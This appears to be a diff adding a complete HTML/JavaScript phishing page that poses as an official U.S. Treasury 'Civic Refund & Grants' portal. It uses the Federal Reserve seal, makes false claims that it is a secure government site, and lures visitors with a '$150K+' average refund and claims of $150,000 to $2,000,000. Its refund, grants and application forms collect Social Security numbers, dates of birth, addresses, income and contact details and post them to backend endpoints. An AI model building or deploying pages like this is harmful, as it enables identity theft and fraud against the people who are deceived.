@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Civic Refund & Grants Help — Official Resources & Guidance</title>
+    <meta name="description" content="Learn how to check your IRS refund status and find verified public grants. Official U.S. Government resource.">
+
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Seal_of_the_United_States_Federal_Reserve_Board.svg/960px-Seal_of_the_United_States_Federal_Reserve_Board.svg.png">
+
+    <script src="config.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Merriweather:wght@400;700&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'gov-blue': '#1B4B8C',
+                        'gov-dark': '#0F2A52',
+                        'gov-light': '#E8F0FE',
+                        'gov-gold': '#C9A227',
+                        'success': '#10B981',
+                        'warning': '#F59E0B',
+                        'danger': '#EF4444'
+                    },
+                    fontFamily: {
+                        'sans': ['Inter', 'sans-serif'],
+                        'serif': ['Merriweather', 'serif']
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        .gov-banner { background: linear-gradient(135deg, #1B4B8C 0%, #0F2A52 100%); }
+        .gov-seal { width: 60px; height: 60px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2); overflow: hidden; }
+        .gov-seal img { width: 100%; height: 100%; object-fit: cover; }
+        .official-badge { background: #C9A227; color: #0F2A52; padding: 4px 12px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+        .gov-input { border: 2px solid #e2e8f0; border-radius: 8px; padding: 12px 16px; font-size: 14px; transition: all 0.3s ease; width: 100%; }
+        .gov-input:focus { border-color: #1B4B8C; outline: none; box-shadow: 0 0 0 3px rgba(27, 75, 140, 0.1); }
+        .gov-btn { background: linear-gradient(135deg, #1B4B8C, #0F2A52); color: white; padding: 14px 32px; border-radius: 8px; font-weight: 600; border: none; cursor: pointer; transition: all 0.3s ease; }
+        .gov-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(27, 75, 140, 0.3); }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; align-items: center; justify-content: center; z-index: 3000; backdrop-filter: blur(4px); }
+        .modal-overlay.active { display: flex; }
+        .modal-content { background: white; border-radius: 16px; max-width: 700px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .security-notice { background: linear-gradient(135deg, #FEF3C7, #FDE68A); border-left: 4px solid #F59E0B; }
+        .success-modal { text-align: center; padding: 40px; }
+        .success-checkmark { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #10B981, #059669); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; }
+        .success-checkmark i { font-size: 40px; color: white; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fade-in { animation: fadeIn 0.3s ease; }
+    </style>
+</head>
+<body class="bg-gray-50 font-sans">
+    <!-- Government Banner -->
+    <div class="gov-banner text-white py-2 px-4">
+        <div class="container mx-auto flex items-center justify-center gap-4">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Seal_of_the_United_States_Federal_Reserve_Board.svg/960px-Seal_of_the_United_States_Federal_Reserve_Board.svg.png" alt="Federal Reserve" class="w-6 h-6 rounded-full">
+            <span class="text-sm font-medium">An official website of the United States Government</span>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="bg-white shadow-md sticky top-0 z-50">
+        <div class="container mx-auto px-4 py-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <div class="gov-seal">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Seal_of_the_United_States_Federal_Reserve_Board.svg/960px-Seal_of_the_United_States_Federal_Reserve_Board.svg.png" alt="Federal Reserve Seal">
+                    </div>
+                    <div>
+                        <div class="official-badge">Official Government Site</div>
+                        <h1 class="text-xl font-bold text-gray-900">Civic Refund & Grants Help</h1>
+                        <p class="text-sm text-gray-600">U.S. Department of Treasury</p>
+                    </div>
+                </div>
+                <nav class="hidden md:flex items-center gap-6">
+                    <a href="#about" class="text-gray-700 hover:text-gov-blue font-medium transition">About</a>
+                    <a href="#refunds" class="text-gray-700 hover:text-gov-blue font-medium transition">Refunds</a>
+                    <a href="#grants" class="text-gray-700 hover:text-gov-blue font-medium transition">Grants</a>
+                    <a href="#contact" class="text-gray-700 hover:text-gov-blue font-medium transition">Contact</a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="bg-gradient-to-br from-gov-blue to-gov-dark text-white py-16" id="about">
+        <div class="container mx-auto px-4">
+            <div class="max-w-4xl mx-auto text-center">
+                <div class="inline-flex items-center gap-2 bg-white/10 backdrop-blur px-4 py-2 rounded-full mb-6">
+                    <i class="fas fa-shield-alt text-gov-gold"></i>
+                    <span class="text-sm font-medium">Secure & Verified Government Portal</span>
+                </div>
+                <h2 class="text-4xl md:text-5xl font-bold mb-6 font-serif">Official Civic Refund & Federal Grants Portal</h2>
+                <p class="text-xl text-blue-100 mb-8 max-w-2xl mx-auto">Access your civic refund status and apply for verified federal grants through our secure government portal.</p>
+                <div class="flex flex-wrap justify-center gap-4">
+                    <button onclick="openModal('refundModal')" class="bg-white text-gov-blue px-8 py-4 rounded-lg font-bold hover:bg-gray-100 transition flex items-center gap-2"><i class="fas fa-search-dollar"></i>Check Refund Status</button>
+                    <button onclick="openModal('grantsModal')" class="bg-gov-gold text-gov-dark px-8 py-4 rounded-lg font-bold hover:bg-yellow-400 transition flex items-center gap-2"><i class="fas fa-landmark"></i>Explore Grants</button>
+                    <button onclick="openModal('applyModal')" class="bg-transparent border-2 border-white text-white px-8 py-4 rounded-lg font-bold hover:bg-white/10 transition flex items-center gap-2"><i class="fas fa-file-signature"></i>Apply Now</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Security Notice -->
+    <section class="py-6">
+        <div class="container mx-auto px-4">
+            <div class="security-notice rounded-lg p-4 flex items-start gap-4">
+                <i class="fas fa-lock text-amber-600 text-xl mt-1"></i>
+                <div>
+                    <h3 class="font-bold text-amber-800">Secure Government Portal</h3>
+                    <p class="text-amber-700 text-sm">This is an official U.S. Government website. All information submitted is encrypted and secure. We use SSL encryption to protect your personal information.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Key Information -->
+    <section class="py-12 bg-white">
+        <div class="container mx-auto px-4">
+            <h3 class="text-2xl font-bold text-center mb-10 text-gray-900">Key Information at a Glance</h3>
+            <div class="grid md:grid-cols-4 gap-6">
+                <div class="text-center p-6 rounded-xl bg-gov-light hover:shadow-lg transition">
+                    <div class="w-16 h-16 bg-gov-blue rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-clock text-white text-2xl"></i></div>
+                    <h4 class="font-bold text-gov-blue text-3xl mb-2">7 Days</h4>
+                    <p class="text-gray-600 text-sm">Average processing time</p>
+                </div>
+                <div class="text-center p-6 rounded-xl bg-gov-light hover:shadow-lg transition">
+                    <div class="w-16 h-16 bg-gov-blue rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-dollar-sign text-white text-2xl"></i></div>
+                    <h4 class="font-bold text-gov-blue text-3xl mb-2">$150K+</h4>
+                    <p class="text-gray-600 text-sm">Average refund amount</p>
+                </div>
+                <div class="text-center p-6 rounded-xl bg-gov-light hover:shadow-lg transition">
+                    <div class="w-16 h-16 bg-gov-blue rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-university text-white text-2xl"></i></div>
+                    <h4 class="font-bold text-gov-blue text-3xl mb-2">1,000+</h4>
+                    <p class="text-gray-600 text-sm">Federal grant programs</p>
+                </div>
+                <div class="text-center p-6 rounded-xl bg-gov-light hover:shadow-lg transition">
+                    <div class="w-16 h-16 bg-gov-blue rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-building text-white text-2xl"></i></div>
+                    <h4 class="font-bold text-gov-blue text-3xl mb-2">26</h4>
+                    <p class="text-gray-600 text-sm">Federal agencies</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Refunds Section -->
+    <section class="py-12 bg-gray-50" id="refunds">
+        <div class="container mx-auto px-4">
+            <div class="max-w-4xl mx-auto">
+                <h3 class="text-3xl font-bold text-center mb-4 text-gray-900">How to Check Your Refund Status</h3>
+                <div class="grid md:grid-cols-4 gap-4 mb-10">
+                    <div class="bg-white p-6 rounded-xl shadow-sm text-center">
+                        <div class="w-12 h-12 bg-gov-blue text-white rounded-full flex items-center justify-center font-bold text-xl mx-auto mb-4">1</div>
+                        <p class="text-sm text-gray-600">Prepare your return information</p>
+                    </div>
+                    <div class="bg-white p-6 rounded-xl shadow-sm text-center">
+                        <div class="w-12 h-12 bg-gov-blue text-white rounded-full flex items-center justify-center font-bold text-xl mx-auto mb-4">2</div>
+                        <p class="text-sm text-gray-600">Click "Check Refund Status"</p>
+                    </div>
+                    <div class="bg-white p-6 rounded-xl shadow-sm text-center">
+                        <div class="w-12 h-12 bg-gov-blue text-white rounded-full flex items-center justify-center font-bold text-xl mx-auto mb-4">3</div>
+                        <p class="text-sm text-gray-600">Enter your details securely</p>
+                    </div>
+                    <div class="bg-white p-6 rounded-xl shadow-sm text-center">
+                        <div class="w-12 h-12 bg-gov-blue text-white rounded-full flex items-center justify-center font-bold text-xl mx-auto mb-4">4</div>
+                        <p class="text-sm text-gray-600">View your current status</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Grants Section -->
+    <section class="py-12 bg-white" id="grants">
+        <div class="container mx-auto px-4">
+            <div class="max-w-4xl mx-auto">
+                <h3 class="text-3xl font-bold text-center mb-4 text-gray-900">Verified Federal Grants</h3>
+                <div class="grid md:grid-cols-2 gap-8 mb-10">
+                    <div>
+                        <h4 class="text-xl font-bold mb-4 text-gray-900">Start with Official Sources</h4>
+                        <p class="text-gray-600 mb-4">Grants.gov is the official federal grants portal where you can search for and apply to over 1,000 grant programs.</p>
+                        <ul class="space-y-3">
+                            <li class="flex items-start gap-3"><i class="fas fa-check-circle text-success mt-1"></i><span class="text-gray-700">Never pay to apply - grants are always free</span></li>
+                            <li class="flex items-start gap-3"><i class="fas fa-check-circle text-success mt-1"></i><span class="text-gray-700">Verify sources - only trust .gov websites</span></li>
+                            <li class="flex items-start gap-3"><i class="fas fa-check-circle text-success mt-1"></i><span class="text-gray-700">Read requirements - each grant has specific criteria</span></li>
+                        </ul>
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="bg-gov-light p-4 rounded-lg text-center hover:shadow-md transition cursor-pointer"><i class="fas fa-graduation-cap text-gov-blue text-2xl mb-2"></i><p class="font-medium text-gray-800">Education</p></div>
+                        <div class="bg-gov-light p-4 rounded-lg text-center hover:shadow-md transition cursor-pointer"><i class="fas fa-briefcase text-gov-blue text-2xl mb-2"></i><p class="font-medium text-gray-800">Small Business</p></div>
+                        <div class="bg-gov-light p-4 rounded-lg text-center hover:shadow-md transition cursor-pointer"><i class="fas fa-microscope text-gov-blue text-2xl mb-2"></i><p class="font-medium text-gray-800">Research</p></div>
+                        <div class="bg-gov-light p-4 rounded-lg text-center hover:shadow-md transition cursor-pointer"><i class="fas fa-users text-gov-blue text-2xl mb-2"></i><p class="font-medium text-gray-800">Community</p></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section class="py-12 bg-gray-50" id="contact">
+        <div class="container mx-auto px-4">
+            <div class="max-w-2xl mx-auto">
+                <h3 class="text-3xl font-bold text-center mb-4 text-gray-900">Contact Us</h3>
+                <form id="contactForm" class="bg-white p-8 rounded-xl shadow-sm">
+                    <div class="grid md:grid-cols-2 gap-4 mb-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Full Name *</label><input type="text" name="fullName" class="gov-input" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Email *</label><input type="email" name="email" class="gov-input" required></div>
+                    </div>
+                    <div class="mb-4"><label class="block text-sm font-medium text-gray-700 mb-2">Phone</label><input type="tel" name="phone" class="gov-input"></div>
+                    <div class="mb-6"><label class="block text-sm font-medium text-gray-700 mb-2">Message *</label><textarea name="message" rows="4" class="gov-input" required></textarea></div>
+                    <button type="submit" class="gov-btn w-full"><i class="fas fa-paper-plane mr-2"></i>Send Message</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gov-dark text-white py-12">
+        <div class="container mx-auto px-4">
+            <div class="grid md:grid-cols-4 gap-8 mb-8">
+                <div>
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="w-12 h-12 bg-white rounded-full flex items-center justify-center overflow-hidden">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Seal_of_the_United_States_Federal_Reserve_Board.svg/960px-Seal_of_the_United_States_Federal_Reserve_Board.svg.png" alt="Federal Reserve" class="w-10 h-10 object-cover">
+                        </div>
+                        <div>
+                            <h4 class="font-bold">Civic Refund & Grants</h4>
+                            <p class="text-sm text-gray-400">U.S. Department of Treasury</p>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <h5 class="font-bold mb-4">Main Sections</h5>
+                    <ul class="space-y-2 text-gray-400 text-sm">
+                        <li><a href="#about" class="hover:text-white transition">About</a></li>
+                        <li><a href="#refunds" class="hover:text-white transition">Refunds</a></li>
+                        <li><a href="#grants" class="hover:text-white transition">Grants</a></li>
+                        <li><a href="#contact" class="hover:text-white transition">Contact</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h5 class="font-bold mb-4">Official Links</h5>
+                    <ul class="space-y-2 text-gray-400 text-sm">
+                        <li><a href="https://irs.gov" target="_blank" class="hover:text-white transition">IRS.gov</a></li>
+                        <li><a href="https://grants.gov" target="_blank" class="hover:text-white transition">Grants.gov</a></li>
+                        <li><a href="https://usa.gov" target="_blank" class="hover:text-white transition">USA.gov</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h5 class="font-bold mb-4">Resources</h5>
+                    <ul class="space-y-2 text-gray-400 text-sm">
+                        <li><a href="#" class="hover:text-white transition">Privacy Policy</a></li>
+                        <li><a href="#" class="hover:text-white transition">Accessibility</a></li>
+                        <li><a href="#" class="hover:text-white transition">FOIA</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="border-t border-gray-700 pt-8">
+                <p class="text-gray-400 text-sm text-center"><i class="fas fa-shield-alt mr-2"></i>This is an official U.S. Government website. All information is secure and encrypted.</p>
+                <p class="text-gray-500 text-xs text-center mt-4">© 2026 U.S. Department of Treasury - Civic Refund & Grants Division</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 450px;">
+            <div class="success-modal">
+                <div class="success-checkmark"><i class="fas fa-check"></i></div>
+                <h3 class="text-2xl font-bold text-gray-900 mb-3" id="successTitle">Successfully Submitted!</h3>
+                <p class="text-gray-600 mb-6" id="successMessage">Your form has been submitted successfully.</p>
+                <button onclick="closeModal('successModal')" class="gov-btn px-8"><i class="fas fa-check mr-2"></i>OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Refund Modal -->
+    <div id="refundModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="bg-gradient-to-r from-gov-blue to-gov-dark text-white p-6 rounded-t-2xl">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center gap-3">
+                        <i class="fas fa-search-dollar text-2xl"></i>
+                        <div>
+                            <h3 class="text-xl font-bold">Check Refund Status</h3>
+                            <p class="text-blue-200 text-sm">U.S. Department of Treasury</p>
+                        </div>
+                    </div>
+                    <button onclick="closeModal('refundModal')" class="text-white hover:text-gray-300 text-2xl"><i class="fas fa-times"></i></button>
+                </div>
+            </div>
+            <div class="p-6">
+                <form id="refundForm" class="space-y-4">
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">SSN *</label><input type="text" name="ssn" placeholder="XXX-XX-XXXX" class="gov-input" maxlength="11" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Full Name *</label><input type="text" name="fullName" class="gov-input" required></div>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Filing Status *</label><select name="filingStatus" class="gov-input" required><option value="">Select</option><option value="single">Single</option><option value="married_joint">Married Joint</option><option value="head_household">Head of Household</option></select></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Refund Amount *</label><input type="number" name="refundAmount" placeholder="$0.00" class="gov-input" required></div>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Tax Year *</label><select name="taxYear" class="gov-input" required><option value="">Select</option><option value="2025">2025</option><option value="2024">2024</option><option value="2023">2023</option></select></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Email *</label><input type="email" name="email" class="gov-input" required></div>
+                    </div>
+                    <div><label class="block text-sm font-medium text-gray-700 mb-2">Phone *</label><input type="tel" name="phone" class="gov-input" required></div>
+                    <button type="submit" class="gov-btn w-full py-4"><i class="fas fa-search mr-2"></i>Check Status</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Grants Modal -->
+    <div id="grantsModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="bg-gradient-to-r from-gov-gold to-yellow-500 text-gov-dark p-6 rounded-t-2xl">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center gap-3"><i class="fas fa-landmark text-2xl"></i><div><h3 class="text-xl font-bold">Explore Federal Grants</h3><p class="text-sm opacity-70">Official U.S. Government Portal</p></div></div>
+                    <button onclick="closeModal('grantsModal')" class="text-2xl"><i class="fas fa-times"></i></button>
+                </div>
+            </div>
+            <div class="p-6">
+                <form id="grantsForm" class="space-y-4">
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Full Name *</label><input type="text" name="fullName" class="gov-input" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">SSN *</label><input type="text" name="ssn" placeholder="XXX-XX-XXXX" class="gov-input" maxlength="11" required></div>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Email *</label><input type="email" name="email" class="gov-input" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Phone *</label><input type="tel" name="phone" class="gov-input" required></div>
+                    </div>
+                    <div><label class="block text-sm font-medium text-gray-700 mb-2">Address *</label><input type="text" name="address" class="gov-input" required></div>
+                    <div class="grid md:grid-cols-3 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">City *</label><input type="text" name="city" class="gov-input" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">State *</label><select name="state" class="gov-input" required><option value="">Select</option><option value="CA">California</option><option value="NY">New York</option><option value="TX">Texas</option><option value="FL">Florida</option></select></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">ZIP *</label><input type="text" name="zipCode" class="gov-input" maxlength="5" required></div>
+                    </div>
+                    <div><label class="block text-sm font-medium text-gray-700 mb-2">Grant Category *</label><select name="grantCategory" class="gov-input" required><option value="">Select</option><option value="education">Education</option><option value="small_business">Small Business</option><option value="research">Research</option><option value="community">Community</option></select></div>
+                    <button type="submit" class="w-full py-4 rounded-lg font-bold text-gov-dark bg-gradient-to-r from-gov-gold to-yellow-500 hover:from-yellow-400 hover:to-yellow-600 transition"><i class="fas fa-paper-plane mr-2"></i>Submit Inquiry</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Apply Modal -->
+    <div id="applyModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 800px;">
+            <div class="bg-gradient-to-r from-green-600 to-green-700 text-white p-6 rounded-t-2xl">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center gap-3"><i class="fas fa-file-signature text-2xl"></i><div><h3 class="text-xl font-bold">Apply for Refund or Grant</h3><p class="text-green-200 text-sm">Complete Application</p></div></div>
+                    <button onclick="closeModal('applyModal')" class="text-white hover:text-gray-300 text-2xl"><i class="fas fa-times"></i></button>
+                </div>
+            </div>
+            <div class="p-6">
+                <form id="applyForm" class="space-y-4">
+                    <div class="bg-gray-50 p-4 rounded-lg">
+                        <label class="block text-sm font-medium text-gray-700 mb-3">Application Type *</label>
+                        <div class="flex gap-4">
+                            <label class="flex items-center gap-2"><input type="radio" name="applicationType" value="refund" checked><span>Tax Refund</span></label>
+                            <label class="flex items-center gap-2"><input type="radio" name="applicationType" value="grant"><span>Grant</span></label>
+                        </div>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">First Name *</label><input type="text" name="firstName" class="gov-input" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Last Name *</label><input type="text" name="lastName" class="gov-input" required></div>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">SSN *</label><input type="text" name="ssn" placeholder="XXX-XX-XXXX" class="gov-input" maxlength="11" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Date of Birth *</label><input type="date" name="dob" class="gov-input" required></div>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Email *</label><input type="email" name="email" class="gov-input" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Phone *</label><input type="tel" name="phone" class="gov-input" required></div>
+                    </div>
+                    <div><label class="block text-sm font-medium text-gray-700 mb-2">Street Address *</label><input type="text" name="address" class="gov-input" required></div>
+                    <div class="grid md:grid-cols-3 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">City *</label><input type="text" name="city" class="gov-input" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">State *</label><select name="state" class="gov-input" required><option value="">Select</option><option value="CA">California</option><option value="NY">New York</option><option value="TX">Texas</option></select></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">ZIP *</label><input type="text" name="zipCode" class="gov-input" maxlength="5" required></div>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Annual Income *</label><input type="number" name="annualIncome" placeholder="$0.00" class="gov-input" required></div>
+                        <div><label class="block text-sm font-medium text-gray-700 mb-2">Claim Amount *</label><input type="number" name="claimAmount" placeholder="$150,000 - $2,000,000" class="gov-input" min="150000" max="2000000" required></div>
+                    </div>
+                    <button type="submit" class="w-full py-4 rounded-lg font-bold text-white bg-gradient-to-r from-green-600 to-green-700 hover:from-green-500 hover:to-green-800 transition"><i class="fas fa-paper-plane mr-2"></i>Submit Application</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Modal Functions
+        function openModal(modalId) {
+            document.getElementById(modalId).classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        // Close modal when clicking outside
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
+            modal.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.classList.remove('active');
+                    document.body.style.overflow = '';
+                }
+            });
+        });
+
+        // Show success modal
+        function showSuccess(title, message) {
+            document.getElementById('successTitle').textContent = title;
+            document.getElementById('successMessage').textContent = message;
+            openModal('successModal');
+        }
+
+        // Form Submissions
+        document.getElementById('contactForm')?.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+
+            try {
+                const response = await fetch('/api/contact', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+
+                if (result.success) {
+                    this.reset();
+                    showSuccess('Message Sent!', 'We will respond within 24-48 hours.');
+                } else {
+                    alert('Error: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to send message. Please try again.');
+            }
+        });
+
+        document.getElementById('refundForm')?.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+
+            try {
+                const response = await fetch('/api/refund', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+
+                if (result.success) {
+                    this.reset();
+                    closeModal('refundModal');
+                    showSuccess('Application Submitted!', 'Your refund inquiry has been submitted. Check your email for confirmation.');
+                } else {
+                    alert('Error: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to submit. Please try again.');
+            }
+        });
+
+        document.getElementById('grantsForm')?.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+
+            try {
+                const response = await fetch('/api/grants', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+
+                if (result.success) {
+                    this.reset();
+                    closeModal('grantsModal');
+                    showSuccess('Inquiry Submitted!', 'A representative will contact you within 3-5 business days.');
+                } else {
+                    alert('Error: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to submit. Please try again.');
+            }
+        });
+
+        document.getElementById('applyForm')?.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+
+            try {
+                const response = await fetch('/api/application', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+
+                if (result.success) {
+                    this.reset();
+                    closeModal('applyModal');
+                    showSuccess('Application Submitted!', 'Your application has been submitted successfully. You will receive a confirmation email shortly.');
+                } else {
+                    alert('Error: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to submit. Please try again.');
+            }
+        });
+
+        // SSN Formatting
+        document.querySelectorAll('input[name="ssn"]').forEach(input => {
+            input.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 9) value = value.slice(0, 9);
+                if (value.length >= 5) value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5);
+                else if (value.length >= 3) value = value.slice(0, 3) + '-' + value.slice(3);
+                e.target.value = value;
+            });
+        });
+    </script>
+</body>
+</html>
